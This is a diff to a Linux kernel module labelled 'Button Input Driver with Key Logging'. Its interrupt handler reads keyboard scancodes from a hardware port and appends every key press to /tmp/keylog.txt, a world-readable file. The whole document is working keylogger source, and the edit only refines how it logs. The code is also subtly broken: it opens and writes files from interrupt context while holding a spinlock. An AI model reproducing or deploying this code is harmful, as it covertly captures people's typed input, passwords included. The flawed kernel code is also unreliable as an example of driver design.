@@ -6,14 +6,7 @@
 #include <linux/io.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
-#include <linux/netdevice.h>
-#include <linux/uuid.h>
-#include <linux/fs.h>
-#include <linux/kernel.h>
-#include <linux/inetdevice.h>
-#include <asm/processor.h>
-
-#include "codeTable.h"
+#include <linux/spinlock.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Your Name");
@@ -24,61 +17,73 @@ MODULE_DESCRIPTION("Button Input Driver with Key Logging");
 #define LOG_FILE_PATH "/tmp/keylog.txt"
 
 static struct input_dev *button_dev;
-const char *uniqueId;
+static DEFINE_SPINLOCK(file_lock);
 
-    // Funkcja zapisująca dane do pliku logu
-    static void
-    write_to_log_file(const char *data)
+// Funkcja zapisująca dane do pliku logu
+static void write_to_log_file(const char *data)
 {
-    loff_t pos = 0;
     struct file *log_file;
+    ssize_t ret;
+
+    spin_lock(&file_lock);
 
     // Otwórz plik do zapisu (lub utwórz, jeśli nie istnieje)
     log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (IS_ERR(log_file))
     {
         pr_err("Failed to open log file\n");
+        spin_unlock(&file_lock);
         return;
     }
+
     // Zapisz dane do pliku
-    kernel_write(log_file, data, strlen(data), 0);
+    ret = kernel_write(log_file, data, strlen(data), &log_file->f_pos);
+    if (ret < 0)
+    {
+        pr_err("Failed to write to log file: %zd\n", ret);
+    }
 
     filp_close(log_file, NULL);
+    spin_unlock(&file_lock);
 }
 
 // Funkcja obsługi przerwania
 static irqreturn_t button_interrupt(int irq, void *dummy)
 {
     int scancode;
-    char log_entry[32];
+    char log_entry[32] = {0};
 
-    scancode = inb(BUTTON_PORT); // Odczytaj scancode z portu
+    scancode = inb(BUTTON_PORT);
 
-    const char *convChar = scancode_to_char(scancode); // Mapowanie scancode na znak
-
-    // Sprawdź, czy to naciśnięcie klawisza, czy zwolnienie
     if (scancode & 0x80)
     {
-        // Zwolnienie klawisza
-        input_report_key(button_dev, scancode & 0x7F, 0); // 0 oznacza zwolnienie klawisza
+        int keycode = scancode & 0x7F;
+
+        input_report_key(button_dev, keycode, 0);
+
+        if (keycode == 42)
+        {
+            snprintf(log_entry, sizeof(log_entry), "%d", 99);
+            write_to_log_file(log_entry);
+        }
     }
     else
     {
-        // Naciśnięcie klawisza
-        snprintf(log_entry, sizeof(log_entry), "%s", convChar); // Zamapowany znak
-        input_report_key(button_dev, scancode, 1);              // 1 oznacza naciśnięcie klawisza
-        write_to_log_file(log_entry);                           // Zapisz do pliku logu
+        input_report_key(button_dev, scancode, 1);
+
+        snprintf(log_entry, sizeof(log_entry), "%d", scancode);
+        write_to_log_file(log_entry);
     }
 
-    input_sync(button_dev); // Synchronizacja zdarzenia
-    return IRQ_HANDLED;     // Zgłoś obsługę przerwania
+    input_sync(button_dev);
+    return IRQ_HANDLED;
 }
 
-// Funkcja inicjalizująca moduł
 static int __init button_init(void)
 {
-
     int error;
+
+    pr_info("Initializing Button Input Driver with Key Logging\n");
 
     // Zarejestruj przerwanie
     if (request_irq(BUTTON_IRQ, button_interrupt, IRQF_SHARED, "button", (void *)button_interrupt))
@@ -108,7 +113,7 @@ static int __init button_init(void)
         goto err_free_dev;
     }
 
-    pr_info("Button input driver with key logging loaded\n");
+    pr_info("Button input driver with key logging loaded successfully\n");
     return 0;
 
 err_free_dev:
